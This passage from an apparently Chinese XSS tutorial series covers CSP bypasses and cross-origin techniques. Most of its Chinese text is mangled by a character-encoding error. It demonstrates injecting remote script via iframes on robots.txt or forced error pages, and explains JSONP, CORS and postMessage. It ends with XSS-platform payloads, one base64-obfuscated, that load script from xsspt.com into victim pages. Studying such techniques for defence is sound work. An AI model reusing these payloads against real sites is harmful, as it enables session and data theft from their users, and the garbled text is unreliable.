‡ç­¾æ”¯æŒcspå±æ€§ï¼Œè¿™æœ‰æ—¶å€™å¯ä»¥ç”¨æ¥ç»•è¿‡ä¸€äº›é˜²å¾¡ï¼Œä¾‹å¦‚\u0026quot;http://xxx\u0026ldquo;é¡µé¢æœ‰ä¸ªjsåº“ä¼šè¿‡æ»¤XSSå‘é‡ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨cspå±æ€§æ¥ç¦æ‰è¿™ä¸ªjsåº“ã€‚\n\u0026lt;iframe csp=\u0026#34;script-src \u0026#39;unsafe-inline\u0026#39;\u0026#34; src=\u0026#34;http://xxx\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; meta meta æ ‡ç­¾æœ‰ä¸€äº›ä¸å¸¸ç”¨çš„åŠŸèƒ½æœ‰æ—¶å€™æœ‰å¥‡æ•ˆï¼š\nmeta å¯ä»¥æ§åˆ¶ç¼“å­˜ï¼ˆåœ¨headeræ²¡æœ‰è®¾ç½®çš„æƒ…å†µä¸‹ï¼‰ï¼Œæœ‰æ—¶å€™å¯ä»¥ç”¨æ¥ç»•è¿‡CSP nonceã€‚\n\u0026lt;meta http-equiv=\u0026#34;cache-control\u0026#34; content=\u0026#34;public\u0026#34;\u0026gt; metaå¯ä»¥è®¾ç½®Cookieï¼ˆFirefoxä¸‹ï¼‰ï¼Œå¯ä»¥ç»“åˆ self-xss åˆ©ç”¨ã€‚\n\u0026lt;meta http-equiv=\u0026#34;Set-Cookie\u0026#34; Content=\u0026#34;cookievalue=xxx;expires=Wednesday,21-Oct-98 16:14:21 GMT; path=/\u0026#34;\u0026gt; Examples Example 1ã€2 å¯ä»¥å‚è€ƒNeatly bypassing CSP\nExample 1 å‡è®¾æœåŠ¡å™¨è®¾ç½®äº†ä»¥ä¸‹ CSP ç­–ç•¥\n\u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;\u0026#34;\u0026gt; è®¾ç½®äº†å…è®¸åŒæºä¸ inline èµ„æºï¼Œæ¥è‡ªå¤–éƒ¨æºçš„æ‰€æœ‰å†…å®¹ä¼šè¢«æ‹¦æˆªï¼Œå…¶ä¸­åŒ…æ‹¬å›¾åƒã€CSSã€websocketsï¼Œå°¤å…¶æ˜¯ JS ä»£ç ã€‚\næ˜¾ç„¶å¦‚æœæˆ‘ä»¬ç›´æ¥ç”¨ä»¥ä¸‹ä»£ç æ˜¯è‚¯å®šä¼šè¢« CSP æ‹¦æˆªçš„\n\u0026lt;script\u0026gt; frame=document.createElement(\u0026#34;iframe\u0026#34;); frame.src=\u0026#34;//bo0om.ru/csp.js\u0026#34;; document.body.appendChild(frame); \u0026lt;/script\u0026gt; ä½†æ˜¯æˆ‘ä»¬éœ€è¦çŸ¥é“ä¸€ç‚¹\n â€‹\tMost of the modern browser automatically convert files, such as text files or images, to an HTML page.\nThe reason for this behavior is to correctly depict the content in the browser window; it needs to have the right background, be centered and so on. However, iframe is also a browser window!. Thus, opening any file that needs to shown in a browser in an iframe (i.e. favicon.ico or robots.txt) will immediately convert them into HTML without any data validation as long as the content-type is right.\n æ€ä¹ˆè¯´å‘¢ï¼Œæ¯”å¦‚æˆ‘ä»¬å…ˆéšä¾¿åˆ›å»ºä¸€ä¸ª html æ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; frame=document.createElement(\u0026#34;iframe\u0026#34;); frame.src=\u0026#34;./bootstrap.min.css\u0026#34;; document.body.appendChild(frame); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å½“å‰ç›®å½•ä¸‹éšä¾¿æ”¾ç½®ä¸€ä¸ªæ–‡ä»¶æä¾›å¼•å…¥å³å¯ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥å‘ç°iframeå½“ä¸­å…¶å®å°±æ˜¯ä¸ª html é¡µé¢\n \nç„¶åæˆ‘ä»¬å°è¯•å¯¹å…¶è¿›è¡Œä¿®æ”¹\nwindow.frames[0].document.head.innerHTML = \u0026#34;hasaki!\u0026#34;;  \næˆ‘ä»¬å°±å¯ä»¥åœ¨iframeçš„é¡µé¢ä¸­å‘ç°\u0026lt;head\u0026gt;æ ‡ç­¾å†…å®¹å·²ç»è¢«æˆ‘ä»¬æ”¹æˆäº†hasaki!\n \nåšåˆ°è¿™é‡Œï¼Œæˆ‘ä»¬åŸºæœ¬å¯ä»¥æƒ³åˆ°ï¼Œå¦‚æœæˆ‘ä»¬å¼•ç”¨çš„æ˜¯ä¸€ä¸ªæ²¡æœ‰ CSP ç­–ç•¥çš„åœ°å€å«æœ‰æ¶æ„çš„ js ä»£ç ä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥è¯•ä¸€ä¸‹\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; f=document.createElement(\u0026#34;iframe\u0026#34;); f.id=\u0026#34;pwn\u0026#34;; f.src=\u0026#34;/robots.txt\u0026#34;; f.onload=()=\u0026gt;{ x=document.createElement(\u0026#39;script\u0026#39;); x.src=\u0026#39;//bo0om.ru/csp.js\u0026#39;; pwn.contentWindow.document.body.appendChild(x) }; document.body.appendChild(f); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Csp.js ä¸­çš„ä»£ç ä¸º\nalert(\u0026#39;Wow! Origin: \u0026#39;+location.origin+\u0026#39;\\nUrl: \u0026#39;+top.location.href+\u0026#39;?\u0026#39;); å¯ä»¥å‘ç°æ‰§è¡Œäº† javascript ä»£ç \n \nExample 2 è®²ä¾‹2ä¹‹å‰æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸ª HTTP å¤´ä¸­çš„ X-Frame-Options å­—æ®µ\n â€‹\tX-Frame-Options HTTP å“åº”å¤´æ˜¯ç”¨æ¥ç»™æµè§ˆå™¨æŒ‡ç¤ºå…è®¸ä¸€ä¸ªé¡µé¢å¯å¦åœ¨\u0026lt;frame\u0026gt;,\u0026lt;iframe\u0026gt;æˆ–è€…\u0026lt;object\u0026gt;ä¸­å±•ç°çš„æ ‡è®°ã€‚ç½‘ç«™å¯ä»¥ä½¿ç”¨æ­¤åŠŸèƒ½ï¼Œæ¥ç¡®ä¿è‡ªå·±ç½‘ç«™çš„å†…å®¹æ²¡æœ‰è¢«åµŒåˆ°åˆ«äººçš„ç½‘ç«™ä¸­å»ï¼Œä¹Ÿä»è€Œé¿å…äº†ç‚¹å‡»åŠ«æŒ (clickjacking) çš„æ”»å‡»ã€‚\nX-Frame-Options æœ‰ä¸‰ä¸ªå€¼:\n  DENY\nè¡¨ç¤ºè¯¥é¡µé¢ä¸å…è®¸åœ¨ frame ä¸­å±•ç¤ºï¼Œå³ä¾¿æ˜¯åœ¨ç›¸åŒåŸŸåçš„é¡µé¢ä¸­åµŒå¥—ä¹Ÿä¸å…è®¸ã€‚\n  SAMEORIGIN\nè¡¨ç¤ºè¯¥é¡µé¢å¯ä»¥åœ¨ç›¸åŒåŸŸåé¡µé¢çš„ frame ä¸­å±•ç¤ºã€‚\n  ALLOW-FROM *uri*\nè¡¨ç¤ºè¯¥é¡µé¢å¯ä»¥åœ¨æŒ‡å®šæ¥æºçš„ frame ä¸­å±•ç¤ºã€‚\n  æ¢ä¸€å¥è¯è¯´ï¼Œå¦‚æœè®¾ç½®ä¸º DENYï¼Œä¸å…‰åœ¨åˆ«äººçš„ç½‘ç«™frameåµŒå…¥æ—¶ä¼šæ— æ³•åŠ è½½ï¼Œåœ¨åŒåŸŸåé¡µé¢ä¸­åŒæ ·ä¼šæ— æ³•åŠ è½½ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœè®¾ç½®ä¸ºSAMEORIGINï¼Œé‚£ä¹ˆé¡µé¢å°±å¯ä»¥åœ¨åŒåŸŸåé¡µé¢çš„frameä¸­åµŒå¥—ã€‚\n å¦‚æœé‚£ä¸ªé¡µé¢é…ç½®äº†X-Frame-Options: Denyçš„è¯ï¼Œå¦‚æœæˆ‘ä»¬è¿˜ç”¨ä¾‹1çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å°±ä¸èƒ½é€šè¿‡è¿™ä¸ªé¡µé¢æ¥ä½¿ç”¨ä¾‹1çš„æ–¹æ³•ï¼Œé‚£å¦‚æœæˆ‘ä»¬åªèƒ½ç”¨è¿™ä¸ªé¡µé¢æœ‰ä»€ä¹ˆæ–¹æ³•å‘¢ï¼Ÿ\næˆ‘ä»¬è¿˜æ˜¯åœ¨ä¹‹å‰çš„ CSP ç­–ç•¥ä¸‹\n\u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;\u0026#34;\u0026gt; ä¸€èˆ¬æ¥è¯´å¾ˆå¤šå¼€å‘äººå‘˜åªåœ¨é¡µé¢å“åº”ç ä¸º 200 æ—¶å¢åŠ äº†X-Frame-Optionsï¼Œè€Œä¸€èˆ¬é”™è¯¯é¡µé¢è¢«è®¤ä¸ºæ˜¯å¯ä»¥ä¸é‚£ä¹ˆå…³æ³¨çš„é¡µé¢ï¼Œæ¯•ç«Ÿåªæ˜¯é™æ€é¡µé¢ï¼Œä¸ä¼šæœ‰ä»€ä¹ˆå¤ªå¤šçš„é—®é¢˜ï¼Œæ‰€ä»¥ä¸€èˆ¬é”™è¯¯é¡µé¢ä¸ä¼šè¢«è®¾ç½®X-Frame-Optionså­—æ®µï¼Œæ£€æµ‹æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œæ‰“å¼€ä¸€ä¸ª 404 é¡µé¢æŸ¥çœ‹æœ‰æ²¡æœ‰è®¾ç½®è¯¥è¯·æ±‚å¤´å°±å¯ä»¥äº†ã€‚\né‰´äºæ­¤ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è®¾æ³•è®©ç½‘ç«™è¿”å›é”™è¯¯é¡µé¢ã€‚ä¾‹å¦‚ï¼Œä¸ºäº†å¼ºåˆ¶ NGINX è¿”å›400 bad requestï¼Œä½ å”¯ä¸€éœ€è¦åšçš„ï¼Œå°±æ˜¯ä½¿ç”¨/../è®¿é—®å…¶ä¸Šä¸€çº§è·¯å¾„ä¸­çš„èµ„æºã€‚ä¸ºé˜²æ­¢æµè§ˆå™¨å¯¹è¯·æ±‚è¿›è¡Œè§„èŒƒåŒ–å¤„ç†ï¼Œå¯¼è‡´/../è¢«/æ‰€æ›¿æ¢ï¼Œå¯¹äºä¸­é—´çš„ä¸¤ä¸ªç‚¹å·å’Œæœ€åä¸€ä¸ªæ–œçº¿ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ unicode ç æ¥è¡¨ç¤ºã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸æ­£ç¡®çš„ unicode è·¯å¾„ï¼Œå¦‚/%zæˆ–/%%zã€‚\nframe=document.createElement(\u0026#34;iframe\u0026#34;); frame.src=\u0026#34;/%2e%2e%2f\u0026#34;; document.body.appendChild(frame); å½“ç„¶ï¼Œå¦‚æœä»¥ä¸Šä¸å¯ç”¨çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¯”è¾ƒç®€å•ä¹Ÿæ¯”è¾ƒæ™®éçš„å¦ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯è®© URL è¶…è¿‡æ‰€å…è®¸çš„é•¿åº¦ã€‚å¤§å¤šæ•°ç°ä»£æµè§ˆå™¨éƒ½å¯ä»¥å‘é€ä¸€ä¸ªæ¯” Web æœåŠ¡å™¨å¯ä»¥å¤„ç†çš„é•¿å¾—å¤šçš„ URL ã€‚è¿™æ ·è¿”å›çŠ¶æ€ä¸º414 Request-URI Too Largeä¾‹å¦‚ï¼Œ NGINX å’Œ Apache ç­‰ Web æœåŠ¡å™¨çš„é»˜è®¤ URL é•¿åº¦é€šå¸¸è¢«è®¾ç½®ä¸ºä¸è¶…è¿‡ 8KB ã€‚å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ payload:\nframe=document.createElement(\u0026#34;iframe\u0026#34;); frame.src=\u0026#34;/\u0026#34;+\u0026#34;A\u0026#34;.repeat(20000); document.body.appendChild(frame); ä¹Ÿå¯ä»¥ä½¿ç”¨è¶…é•¿çš„ cookie æ¥ä½¿æœåŠ¡å™¨è¿”å›é”™è¯¯\n\u0026lt;script\u0026gt; for(var i=0;i\u0026lt;5;i++){ document.cookie=i+\u0026#34;=\u0026#34;+\u0026#34;a\u0026#34;.repeat(4000) }; f=document.createElement(\u0026#34;iframe\u0026#34;); f.id=\u0026#34;pwn\u0026#34;; f.src=\u0026#34;/\u0026#34;; f.onload=()=\u0026gt;{ for(var i=0;i\u0026lt;5;i++){ document.cookie=i+\u0026#34;=\u0026#34; }; x=document.createElement(\u0026#39;script\u0026#39;); x.src=\u0026#39;data:,alert(\u0026#34;Pwned \u0026#34;+top.secret.textContent)\u0026#39;; pwn.contentWindow.document.body.appendChild(x) }; document.body.appendChild(f); \u0026lt;/script\u0026gt; ä¹Ÿå¯ä»¥å‘é€ä¸€ä¸ªè¿‡é•¿çš„ POST è¯·æ±‚ï¼Œæˆ–è€…ä»¥æŸç§æ–¹å¼å¼•å‘ Web æœåŠ¡å™¨çš„500é”™è¯¯ã€‚\nReference CSPç­–ç•¥åŠç»•è¿‡æ–¹æ³•\nXSSç»ˆç»“è€…-CSPç†è®ºä¸å®è·µ\n","date":"2019-03-14T01:54:51Z","permalink":"https://blog.zeddyu.info/2019/03/14/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-III/","title":"Webå®‰å…¨ä»é›¶å¼€å§‹ XSS III"},{"content":"è¿™æ˜¯è‡ªå·±å†™çš„ Web å®‰å…¨ä»é›¶å¼€å§‹ç³»åˆ—ä¹‹ XSS ç¯‡ã€‚ç¬¬äºŒç¯‡è®²è§£åŒæºç­–ç•¥ä¸XSS\n[TOC]\nè·¨åŸŸ XSS ç¦»ä¸å¼€çš„é—®é¢˜å°±æ˜¯è·¨åŸŸé—®é¢˜ï¼Œä¹Ÿæ˜¯æ¯”è¾ƒå¸¸è§çš„é—®é¢˜ã€‚\nä»‹ç» è¿™é‡Œç®€å•åœ°ä»‹ç»ä¸€ä¸‹ä»€ä¹ˆæ˜¯åŒæºç­–ç•¥ã€‚\næ‰€è°“è·¨åŸŸï¼Œæˆ–è€…å¼‚æºï¼Œæ˜¯æŒ‡ä¸»æœºåï¼ˆåŸŸåï¼‰ã€åè®®ã€ç«¯å£å·åªè¦æœ‰å…¶ä¸€ä¸åŒï¼Œå°±ä¸ºä¸åŒçš„åŸŸï¼ˆæˆ–æºï¼‰ã€‚æµè§ˆå™¨ä¸­æœ‰ä¸€ä¸ªåŸºæœ¬çš„ç­–ç•¥ï¼Œå«åŒæºç­–ç•¥ï¼Œå³é™åˆ¶â€œæºâ€è‡ªAçš„è„šæœ¬åªèƒ½æ“ä½œâ€œåŒæºâ€é¡µé¢çš„DOMã€‚\næµè§ˆå™¨ä¸­ï¼Œ\u0026lt;script\u0026gt;/\u0026lt;img\u0026gt;/\u0026lt;iframe\u0026gt;/\u0026lt;link\u0026gt;ç­‰æ ‡ç­¾éƒ½æ˜¯å¯ä»¥è·¨åŸŸæ¥åŠ è½½èµ„æºçš„ï¼Œè€Œä¸å—åŒæºç­–ç•¥çš„å½±å“ã€‚å¸¦\u0026quot;src\u0026quot;å±æ€§çš„æ ‡ç­¾æ¯æ¬¡åŠ è½½æ—¶ï¼Œå®é™…ä¸Šéƒ½æ˜¯æµè§ˆå™¨å‘èµ·äº†ä¸€æ¬¡\u0026quot;GET\u0026quot;è¯·æ±‚ã€‚\nä¸åŒäºXMLHttpRequestçš„æ˜¯ï¼Œé€šè¿‡srcå±æ€§åŠ è½½çš„èµ„æºï¼Œæµè§ˆå™¨æ˜¯é™åˆ¶äº†javascriptçš„æƒé™ï¼Œä½¿å…¶ä¸èƒ½å¤Ÿè¯»å†™è¿”å›çš„å†…å®¹ã€‚å¯¹äº XMLHttpRequestæ¥è¯´ï¼Œå®ƒå¯ä»¥è®¿é—®æ¥è‡ªåŒæºå¯¹è±¡çš„å†…å®¹ã€‚ä½†æ˜¯ä¸èƒ½å¤Ÿè®¿é—®è·¨åŸŸè®¿é—®èµ„æºï¼Œæ‰€æœ‰åœ¨ajaxå¼€å‘ä¸­å°¤å…¶éœ€è¦æ³¨æ„è¿™ç‚¹åœ¨w3cå§”å‘˜ä¼šåˆ¶ å®šäº†XMLHttpRequestè·¨åŸŸè®¿é—®æ ‡å‡†ã€‚ä»–éœ€è¦é€šè¿‡ç›®æ ‡åŸŸè¿”å›çš„HTTPå¤´æˆæƒæ˜¯å¦å…è®¸è·¨åŸŸè®¿é—®ï¼Œå› ä¸ºHTTPå¤´å¯¹äºjavascriptæ¥è¯´ä¸€ èˆ¬æ˜¯æ— æ³•æ§åˆ¶çš„ï¼Œæ‰€ä»¥è®¤ä¸ºè¿™ä¸ªæ–¹æ¡ˆæ˜¯å¯è¡Œçš„ã€‚\nå¯¹äºæµè§ˆå™¨æ¥è¯´ï¼šé™¤äº†DOMã€Cookieã€XMLHttprequestä¼šå—åˆ°åŒæºç­–ç•¥çš„é™åˆ¶å¤–ï¼Œæµè§ˆå™¨åŠ è½½çš„ç¬¬ä¸‰æ–¹æ’ä»¶ä¹Ÿæœ‰å„è‡ªçš„åŒæºç­–ç•¥ã€‚ä¾‹å¦‚ï¼šflash,java applet,silverlight,coogle gearsç­‰ã€‚\nè·¨åŸŸæ–¹æ³•  é€šè¿‡jsonpè·¨åŸŸ document.domain + iframeè·¨åŸŸ location.hash + iframe window.name + iframeè·¨åŸŸ postMessage è·¨åŸŸ è·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰ nginxä»£ç†è·¨åŸŸ nodejsä¸­é—´ä»¶ä»£ç†è·¨åŸŸ WebSocketåè®®è·¨åŸŸ  è¿™é‡Œç®€å•ä»‹ç»å‡ ç§ï¼Œå…¶ä½™çš„å¯ä»¥å‚è€ƒå‰ç«¯å¸¸è§è·¨åŸŸè§£å†³æ–¹æ¡ˆï¼ˆå…¨ï¼‰\nJSONP å¯¹äºä¸€æ®µ JavaScript è„šæœ¬æ¥è¯´ï¼Œå…¶â€œæºâ€ä¸å®ƒå­˜å‚¨çš„åœ°å€æ— å…³ï¼Œè€Œå–å†³äºè„šæœ¬è¢«åŠ è½½çš„é¡µé¢ï¼Œä¾‹å¦‚æˆ‘ä»¬åœ¨é¡µé¢ä¸­ä½¿ç”¨\u0026lt;script\u0026gt;å¼•å…¥å­˜å‚¨åœ¨å…¶ä»–åŸŸçš„è„šæœ¬æ–‡ä»¶ï¼š \u0026lt;script src=\u0026quot;http://www.a.com/index.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; Jsonp æ­£æ˜¯åˆ©ç”¨è¿™ç§ç‰¹æ€§æ¥å®ç°è·¨åŸŸçš„ï¼šåœ¨é¡µé¢ä¸­å¼•å…¥è¦è·¨åŸŸè®¿é—®çš„æ¥æºï¼Œå¹¶å®šä¹‰å›è°ƒå‡½æ•°å¤„ç†è·¨åŸŸè®¿é—®å¾—åˆ°çš„json æ•°æ®ã€‚å¦‚ï¼š\n\u0026lt;script\u0026gt; function handleData(data) { //å¤„ç†æ•°æ® } \u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://www.a.com/getData.do?callback=handleData\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; æœåŠ¡ç«¯ä»£ç ï¼š\nString handleData = request.getParameter(\u0026#34;callback\u0026#34;);//å®¢æˆ·ç«¯çš„å›è°ƒå‡½æ•° out.println(handleData+\u0026#34;(\u0026#34;+resultJSON+\u0026#34;)\u0026#34;);//è¿”å›jsonpæ ¼å¼æ•°æ® ç¼ºé™·æ˜¯åªèƒ½ç”¨äº GET è¯·æ±‚\nDocument.domain www.a.com/1.htmlå’Œa.com/2.htmlæ˜¯ä¸åŒåŸŸçš„ï¼Œè¦ä½¿ä»–ä»¬å¯ä»¥è·¨åŸŸè®¿é—®ï¼Œå¯é€šè¿‡ä¿®æ”¹document.domainæ¥å®ç°ï¼Œå³åœ¨ä¸¤ä¸ªé¡µé¢ä¸­éƒ½è®¾ç½®ï¼š\ndocument.domain=\u0026#34;a.com\u0026#34;; éœ€è¦æ³¨æ„çš„æ˜¯document.domainåªèƒ½å¾€çˆ¶çº§ä¿®æ”¹ï¼Œå¦‚ a.com æ”¹ä¸º www.a.com æ˜¯ä¸è¢«å…è®¸çš„ï¼Œè¿™ä¹Ÿæ˜¯æ­¤æ–¹æ³•çš„å±€é™æ€§ï¼Œåªä½¿ç”¨äºè·¨å­åŸŸè®¿é—®ã€‚\nCROS è·¨åŸŸèµ„æºå…±äº« CORSæ˜¯ä¸€ä¸ªW3Cæ ‡å‡†ï¼Œå…¨ç§°æ˜¯\u0026quot;è·¨åŸŸèµ„æºå…±äº«\u0026quot;ï¼ˆCross-origin resource sharingï¼‰è·¨åŸŸèµ„æºå…±äº« CORS è¯¦è§£ã€‚çœ‹åå­—å°±çŸ¥é“è¿™æ˜¯å¤„ç†è·¨åŸŸé—®é¢˜çš„æ ‡å‡†åšæ³•ã€‚\næ™®é€šè·¨åŸŸè¯·æ±‚ï¼šåªæœåŠ¡ç«¯è®¾ç½®Access-Control-Allow-Originå³å¯ï¼Œå‰ç«¯æ— é¡»è®¾ç½®ï¼Œè‹¥è¦å¸¦cookieè¯·æ±‚ï¼šå‰åç«¯éƒ½éœ€è¦è®¾ç½®ã€‚\néœ€æ³¨æ„çš„æ˜¯ï¼šç”±äºåŒæºç­–ç•¥çš„é™åˆ¶ï¼Œæ‰€è¯»å–çš„cookieä¸ºè·¨åŸŸè¯·æ±‚æ¥å£æ‰€åœ¨åŸŸçš„cookieï¼Œè€Œéå½“å‰é¡µã€‚\npostMessage è·¨åŸŸ postMessageæ˜¯HTML5 XMLHttpRequest Level 2ä¸­çš„APIï¼Œä¸”æ˜¯ä¸ºæ•°ä¸å¤šå¯ä»¥è·¨åŸŸæ“ä½œçš„windowå±æ€§ä¹‹ä¸€ï¼Œå®ƒå¯ç”¨äºè§£å†³ä»¥ä¸‹æ–¹é¢çš„é—®é¢˜ï¼š\n é¡µé¢å’Œå…¶æ‰“å¼€çš„æ–°çª—å£çš„æ•°æ®ä¼ é€’ å¤šçª—å£ä¹‹é—´æ¶ˆæ¯ä¼ é€’ é¡µé¢ä¸åµŒå¥—çš„iframeæ¶ˆæ¯ä¼ é€’ ä¸Šé¢ä¸‰ä¸ªåœºæ™¯çš„è·¨åŸŸæ•°æ®ä¼ é€’   postMessage(message, targetOrigin, [transfer]);\nmessage\nå°†è¦å‘é€åˆ°å…¶ä»– windowçš„æ•°æ®ã€‚å®ƒå°†ä¼šè¢«ç»“æ„åŒ–å…‹éš†ç®—æ³•åºåˆ—åŒ–ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥ä¸å—ä»€ä¹ˆé™åˆ¶çš„å°†æ•°æ®å¯¹è±¡å®‰å…¨çš„ä¼ é€ç»™ç›®æ ‡çª—å£è€Œæ— éœ€è‡ªå·±åºåˆ—åŒ–ã€‚\ntargetOrigin\né€šè¿‡çª—å£çš„originå±æ€§æ¥æŒ‡å®šå“ªäº›çª—å£èƒ½æ¥æ”¶åˆ°æ¶ˆæ¯äº‹ä»¶ï¼Œå…¶å€¼å¯ä»¥æ˜¯å­—ç¬¦ä¸²\u0026quot;*\u0026quot;ï¼ˆè¡¨ç¤ºæ— é™åˆ¶ï¼‰æˆ–è€…ä¸€ä¸ªURIã€‚åœ¨å‘é€æ¶ˆæ¯çš„æ—¶å€™ï¼Œå¦‚æœç›®æ ‡çª—å£çš„åè®®ã€ä¸»æœºåœ°å€æˆ–ç«¯å£è¿™ä¸‰è€…çš„ä»»æ„ä¸€é¡¹ä¸åŒ¹é…targetOriginæä¾›çš„å€¼ï¼Œé‚£ä¹ˆæ¶ˆæ¯å°±ä¸ä¼šè¢«å‘é€ï¼›åªæœ‰ä¸‰è€…å®Œå…¨åŒ¹é…ï¼Œæ¶ˆæ¯æ‰ä¼šè¢«å‘é€ã€‚è¿™ä¸ªæœºåˆ¶ç”¨æ¥æ§åˆ¶æ¶ˆæ¯å¯ä»¥å‘é€åˆ°å“ªäº›çª—å£ï¼›ä¾‹å¦‚ï¼Œå½“ç”¨postMessageä¼ é€å¯†ç æ—¶ï¼Œè¿™ä¸ªå‚æ•°å°±æ˜¾å¾—å°¤ä¸ºé‡è¦ï¼Œå¿…é¡»ä¿è¯å®ƒçš„å€¼ä¸è¿™æ¡åŒ…å«å¯†ç çš„ä¿¡æ¯çš„é¢„æœŸæ¥å—è€…çš„originå±æ€§å®Œå…¨ä¸€è‡´ï¼Œæ¥é˜²æ­¢å¯†ç è¢«æ¶æ„çš„ç¬¬ä¸‰æ–¹æˆªè·ã€‚å¦‚æœä½ æ˜ç¡®çš„çŸ¥é“æ¶ˆæ¯åº”è¯¥å‘é€åˆ°å“ªä¸ªçª—å£ï¼Œé‚£ä¹ˆè¯·å§‹ç»ˆæä¾›ä¸€ä¸ªæœ‰ç¡®åˆ‡å€¼çš„targetOriginï¼Œè€Œä¸æ˜¯*ã€‚ä¸æä¾›ç¡®åˆ‡çš„ç›®æ ‡å°†å¯¼è‡´æ•°æ®æ³„éœ²åˆ°ä»»ä½•å¯¹æ•°æ®æ„Ÿå…´è¶£çš„æ¶æ„ç«™ç‚¹ã€‚\ntransfer \næ˜¯ä¸€ä¸²å’Œmessage åŒæ—¶ä¼ é€’çš„ Transferable å¯¹è±¡. è¿™äº›å¯¹è±¡çš„æ‰€æœ‰æƒå°†è¢«è½¬ç§»ç»™æ¶ˆæ¯çš„æ¥æ”¶æ–¹ï¼Œè€Œå‘é€ä¸€æ–¹å°†ä¸å†ä¿æœ‰æ‰€æœ‰æƒã€‚\n ä¸¾ä¸ªä¾‹å­ï¼š\na.htmlï¼š(http://www.domain1.com/a.html)\n\u0026lt;iframe id=\u0026#34;iframe\u0026#34; src=\u0026#34;http://www.domain2.com/b.html\u0026#34; style=\u0026#34;display:none;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;script\u0026gt; var iframe = document.getElementById(\u0026#39;iframe\u0026#39;); iframe.onload = function() { var data = { name: \u0026#39;aym\u0026#39; }; // å‘domain2ä¼ é€è·¨åŸŸæ•°æ®  iframe.contentWindow.postMessage(JSON.stringify(data), \u0026#39;http://www.domain2.com\u0026#39;); }; // æ¥å—domain2è¿”å›æ•°æ®  window.addEventListener(\u0026#39;message\u0026#39;, function(e) { alert(\u0026#39;data from domain2 ---\u0026gt; \u0026#39; + e.data); }, false); \u0026lt;/script\u0026gt; b.htmlï¼š(http://www.domain2.com/b.html))\n\u0026lt;script\u0026gt; // æ¥æ”¶domain1çš„æ•°æ®  window.addEventListener(\u0026#39;message\u0026#39;, function(e) { alert(\u0026#39;data from domain1 ---\u0026gt; \u0026#39; + e.data); var data = JSON.parse(e.data); if (data) { data.number = 16; // å¤„ç†åå†å‘å›domain1  window.parent.postMessage(JSON.stringify(data), \u0026#39;http://www.domain1.com\u0026#39;); } }, false); \u0026lt;/script\u0026gt; XSS ä¸­çš„è·¨åŸŸ è¿™é‡Œç»™ xsspt.com ä¸Šçš„å‡ ä¸ªä¾‹å­\n\u0026lt;img src=x onerror=eval(atob(\u0026#39;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwczovL3hzc3B0LmNvbS9YWGN4b3U/JytNYXRoLnJhbmRvbSgp\u0026#39;))\u0026gt; \u0026lt;script src=//xsspt.com/XXcxou\u0026gt;\u0026lt;/script\u0026gt; æˆ–è€…\njavascript:eval(\u0026#39;window.s=document.createElement(\u0026#34;script\u0026#34;);window.s.src=\u0026#34;//xsspt.com/XXcxou\u0026#34;;document.body.appendChild(window.s)\u0026#39;) 